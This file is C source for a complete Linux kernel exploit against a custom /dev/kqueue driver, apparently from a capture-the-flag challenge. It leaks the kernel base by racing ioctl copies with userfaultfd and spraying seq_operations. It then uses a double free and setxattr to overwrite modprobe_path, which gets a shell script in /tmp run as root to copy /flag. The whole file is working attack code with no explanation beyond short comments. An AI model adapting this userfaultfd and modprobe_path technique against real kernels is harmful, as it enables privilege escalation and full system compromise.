#define _GNU_SOURCE
#include<string.h> 
#include<stdio.h> 
#include<fcntl.h> 
#include<stdint.h> 
#include<unistd.h> 
#include<assert.h> 
#include<stdlib.h> 
#include<signal.h> 
#include<poll.h> 
#include<pthread.h> 
#include<err.h> 
#include<errno.h> 
#include<sched.h> 
#include<linux/bpf.h> 
#include<linux/filter.h> 
#include<linux/userfaultfd.h> 
#include<linux/prctl.h> 
#include<sys/syscall.h> 
#include<sys/ipc.h> 
#include<sys/msg.h> 
#include<sys/prctl.h> 
#include<sys/ioctl.h> 
#include<sys/mman.h> 
#include<sys/types.h> 
#include<sys/xattr.h> 
#include<sys/socket.h> 
#include<sys/uio.h> 
#include<sys/shm.h> 

// commands
#define DEV_PATH "/dev/kqueue"
#define ENQUEUE 0x1314001
#define DEQUEUE 0x1314002

// constants
#define PAGE_SIZE 0x1000

// exploit values
#define SPRAY_AMOUNT 1
#define SEQ_OPERATIONS_STOP 0x10d4b0
#define MODPROBE_PATH 0xa2ad40

// globals
int global_fd = -1;
unsigned long kernel = -1;

// wrappers
void enqueue(char* data) {
    printf("[*] Enqueue: %p\n", data);
    long ret = ioctl(global_fd, ENQUEUE, data);
    assert(ret == 0);
}

void dequeue(char* data) {
    printf("[*] Dequeue: %p\n", data);
    long ret = ioctl(global_fd, DEQUEUE, data);
    assert(ret == 0);
}

// userfaultfd utils
struct fault_handler {
    const char *desc;
    pthread_t thread;
    void *page;
    int uffd;
    char value[PAGE_SIZE];
    void (*callback)(void *);
    void *arg;
};

static void* fault_handler_thread(void* arg) {
    struct fault_handler* fh = arg;

    // Wait for poll
    struct pollfd pollfd;
    pollfd.fd = fh->uffd;
    pollfd.events = POLLIN;
    int nready = poll(&pollfd, 1, -1);
    printf("[*] poll({%s, POLLIN}) = %d\n", fh->desc, nready);
    assert(nready >= 0);

    // Read an event
    struct uffd_msg msg;
    ssize_t nread = read(fh->uffd, &msg, sizeof(msg));
    printf("[*] read(%s) = %zd\n", fh->desc, nread);
    assert(nread == sizeof(msg));
    assert(msg.event == UFFD_EVENT_PAGEFAULT);
    assert(msg.arg.pagefault.address == (__u64)fh->page);

    // Fault handler thread process function while other thread is halted
    fh->callback(fh->arg);

    // Continuing halted thread
    struct uffdio_copy uffdio_copy;
    uffdio_copy.src = (__u64)fh->value;
    uffdio_copy.dst = (__u64)fh->page;
    uffdio_copy.len = PAGE_SIZE;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    int ret = ioctl(fh->uffd, (int)UFFDIO_COPY, &uffdio_copy);
    printf("[*] ioctl(%s, UFFDIO_COPY) = %d\n", fh->desc, ret);
    assert(ret == 0);

    return NULL;
}

static void fault_handler_init(struct fault_handler* fh, const char* desc, void* page,
                               unsigned long value, void (*callback)(void*),
                               void* arg) { 
    fh->desc = desc;
    *(unsigned long *)fh->value = value;
    fh->callback = callback;
    fh->arg = arg;

    // Fault page mmap
    if (page == NULL) {
        fh->page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        printf("[*] %s->page = %p\n", fh->desc, fh->page);
        assert(fh->page != MAP_FAILED);
    } else {
        fh->page = page;
    }

    // Create uffd file descriptor
    fh->uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    printf("[*] %s->uffd = %d\n", fh->desc, fh->uffd);
    assert(fh->uffd != -1);
    
    // Enable uffd object
    struct uffdio_api uffdio_api;
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    int ret = ioctl(fh->uffd, UFFDIO_API, &uffdio_api);
    printf("[*] ioctl(%s, UFFDIO_API) = %d\n", fh->desc, ret);
    assert(ret == 0);

    // Specify memory region handled by uffd
    struct uffdio_register uffdio_register;
    uffdio_register.range.start = (unsigned long)fh->page;
    uffdio_register.range.len = PAGE_SIZE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    ret = ioctl(fh->uffd, UFFDIO_REGISTER, &uffdio_register);
    printf("[*] ioctl(%s, UFFDIO_REGISTER) = %d\n", fh->desc, ret);
    assert(ret == 0);

    // Create fault handler thread
    ret = pthread_create(&fh->thread, NULL, fault_handler_thread, fh);
    printf("[*] pthread_create(%s) = %d\n", fh->desc, ret);
    assert(ret == 0);
}

static void fault_handler_destroy(struct fault_handler* fh) {
    // Wait for fault handler thread to finish, close uffd, unmap fault page
    void *retval;
    pthread_join(fh->thread, &retval);
    close(fh->uffd);
    munmap(fh->page, PAGE_SIZE);
}

// Exploit funcs
struct leak_kernel_ctx {
    int seq_operations_fds[SPRAY_AMOUNT];
};

static void spray_seq_operations(int *fds, size_t n) {
    for (size_t i = 0; i < n; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        assert(fds[i] != -1);
    }
}

static void free_seq_operations(int *fds, size_t n) {
    for (size_t i = 0; i < n; i++)
        close(fds[i]);
}

static void leak_kernel_callback(void* arg) {
    struct leak_kernel_ctx *ctx = arg;

    char tmp[100];
    dequeue(tmp);
}

static unsigned long leak_kernel(int fd) {
    char buf[100] = "AAAAAAAA";

    enqueue(buf);
    dequeue(buf); // need to do this or it won't work (dunno why?)
    
    enqueue(buf);
    
    struct leak_kernel_ctx ctx;
    struct fault_handler fh;
    fault_handler_init(&fh, "leak_kernel", NULL, 0, leak_kernel_callback, &ctx);
    dequeue(fh.page);

    enqueue(buf);
    spray_seq_operations(ctx.seq_operations_fds, sizeof(ctx.seq_operations_fds) / sizeof(ctx.seq_operations_fds[0]));
    dequeue(buf);
    unsigned long leak = *(unsigned long *)buf;
    printf("[*] seq_operations->stop = 0x%lx\n", leak);

    fault_handler_destroy(&fh);

    kernel = leak - SEQ_OPERATIONS_STOP;
    if ((kernel & 0xfff) == 0) {
        printf("[*] kernel = 0x%lx\n", kernel);
        return kernel;
    }

    return -1;
}

void get_flag(void){
    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    system("/tmp/dummy");
    system("cat /tmp/flag");

    exit(0);
}

static void overwrite_callback(void* arg) {
    char tmp[100];
    dequeue(tmp);
    return;
}

static void setxattr_callback(void* arg) {
    unsigned long tmp_x = 0x782f706d742f;
    enqueue((char*)(&tmp_x));
    enqueue((char*)(&tmp_x));

    get_flag();
    return;
}

static void overwrite(int fd) {
    char buf[100] = "BBBBBBBB";
    enqueue(buf);

    struct fault_handler fh;
    fault_handler_init(&fh, "overwrite", NULL, 0, overwrite_callback, NULL);
    dequeue(fh.page); // double free

    fault_handler_destroy(&fh);

    struct fault_handler fh2;
    void* setxattr_page = mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("[*] setxattr_page = %p\n", setxattr_page);
    assert(setxattr_page != MAP_FAILED);

    fault_handler_init(&fh2, "setxattr", setxattr_page + PAGE_SIZE, 0, setxattr_callback, NULL);
    *(unsigned long*)((char*)setxattr_page + PAGE_SIZE - 8) = kernel + MODPROBE_PATH - 8;
    setxattr("/tmp", "PogO", (char*)setxattr_page + PAGE_SIZE - 8, 0x20, XATTR_CREATE); // overwrite modprobe_path

    printf("[*] UNREACHABLE\n");
}


// MAIN
int main(int argc, char* argv[]) {
    printf("[*] Binding to CPU 0...\n");
    cpu_set_t aff;
    CPU_ZERO(&aff);
    CPU_SET(0, &aff);
    int setaffinity_ret = sched_setaffinity(0, sizeof(cpu_set_t), &aff);
    assert(setaffinity_ret == 0);

    global_fd = open(DEV_PATH, O_RDONLY);
    printf("[*] global_fd = %d\n", global_fd);
    assert(global_fd != -1);

    unsigned long leak = leak_kernel(global_fd);
    assert(leak != -1);

    overwrite(global_fd);

    return 0;
}
